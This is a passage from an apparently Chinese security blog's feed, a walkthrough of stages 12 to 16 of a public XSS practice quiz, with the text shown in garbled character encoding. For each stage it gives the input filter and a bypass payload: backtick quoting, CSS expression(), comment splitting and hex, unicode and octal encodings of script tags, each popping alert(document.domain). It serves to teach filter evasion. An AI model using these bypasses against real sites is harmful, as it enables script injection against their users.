rel="external">http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a</a></em></strong><br>æ­¤é¢˜è¿‡æ»¤è§„åˆ™å¦‚ä¸‹ï¼šâ€s/[\x00-\x20\&lt;>\â€\â€™]//g;â€ï¼Œè¿‡æ»¤å¾ˆä¸¥ï¼Œä»x00-x20,&lt;&gt;,â€â€™éƒ½è¢«è¿‡æ»¤ï¼Œäºæ˜¯ç”¨ä»€ä¹ˆé—­åˆæ˜¯æ­¤é¢˜çš„å…³é”®ï¼Œåœ¨IE8ä¸‹å¯ä»¥é€šè¿‡`è¿›è¡Œé—­åˆå› æ­¤ï¼Œå¯ä»¥æ„é€ payloadï¼š<br><code>`` onmouseover=alert(document.domain);</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-11.png" alt="å›¾11"></p><p><strong><em>Stage#13: <a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7</a></em></strong><br>æ­¤é¢˜è¯´æ˜¯å†CSSä¸­ç”¨expressionæ¥å®ç°jsä¸­çš„onäº‹ä»¶ï¼Œè¿›è€Œæ‰§è¡Œxssè¯­å¥ï¼Œå†ieä¸‹å¯ä»¥åˆ©ç”¨ï¼Œpayloadå¦‚ä¸‹ï¼šxx:expression(onmouseover=function(){alert(document.domain)})</p><p><strong><em>Stage#14: <a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b</a></em></strong><br>æ­¤é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä½†æ˜¯åšäº†è¿‡æ»¤ï¼šs/(url|script|eval|expression)/xxx/ig;è¿‡æ»¤urlï¼Œevalï¼Œscriptï¼Œexpressionå› æ­¤ï¼Œéœ€è¦å°è¯•ç»•è¿‡è¿‡æ»¤ï¼Œç»è¿‡å°è¯•ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦<code>/**/ã€\ã€\0ã€ç¼–ç </code>ç­‰æ–¹å¼ç»•è¿‡ã€‚Payloadå¦‚ï¼š<br><code>xx:expre/**/ssion(onmouseover=function(){alert(document.domain)})</code></p><p><strong><em>Stage#15ï¼š<a href="http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726</a></em></strong><br>æœ¬é¢˜ç»è¿‡æµ‹è¯•å°†&lt;&gt;è¿›è¡Œäº†è½¬ä¹‰ï¼Œå¹¶ä¸”è¿‡æ»¤äº†\ï¼Œæ— æ³•ä½¿ç”¨äº‹ä»¶ç±»å‹æ„é€ è¯­å¥å®ç°å¼¹çª—ã€‚å› æ­¤è€ƒè™‘ç»•è¿‡å…¶è¿‡æ»¤è§„åˆ™ï¼Œç»è¿‡æµ‹è¯•ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç è¿›è¡Œç»•è¿‡å°†&lt;&gt;è¿›è¡Œ16è¿›åˆ¶ç¼–ç æˆ–è€…unicodeç¼–ç å³å¯ã€‚Payload:<br><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code><br><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-12.png" alt="å›¾12"></p><p><strong><em>Stage#16ï¼š<a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9</a></em></strong><br>æ­¤é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œå¤šä¸€éƒ¨åˆ†è¿‡æ»¤ï¼šâ€s/\x/\\x/ig;â€ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨16è¿›åˆ¶æ¥ç»•è¿‡&lt;&gt;çš„è¿‡æ»¤ï¼Œç”¨unicodeç¼–ç åŒæ ·å¯ä»¥ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨10è¿›åˆ¶ç»•è¿‡ã€‚<br>Payload: <code>\\74script\\76alert(document.domain);\\74/script\\76</code></p><p>Stage#17ã€Stage#18å› ä¸ºç‰ˆæœ¬é—®é¢˜ï¼Œè¿‡ä¸å»23333333ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ç§‘æ™®&quot;&gt;&lt;a href=&quot;#ç§‘æ™®&quot; class=&quot;headerlink&quot; title=&quot;ç§‘æ™®&quot;&gt;&lt;/a&gt;ç§‘æ™®&lt;/h2&gt;&lt;p&gt;XSSæ¼æ´æ˜¯ä¸€ç§ç»å¸¸å‡ºç°åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­ã€‚æ¯”å¦‚è¿™äº›ä»£ç åŒ…æ‹¬HTMLä»£ç å’Œå®¢æˆ·ç«¯è„šæœ¬ã€‚
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
</feed>
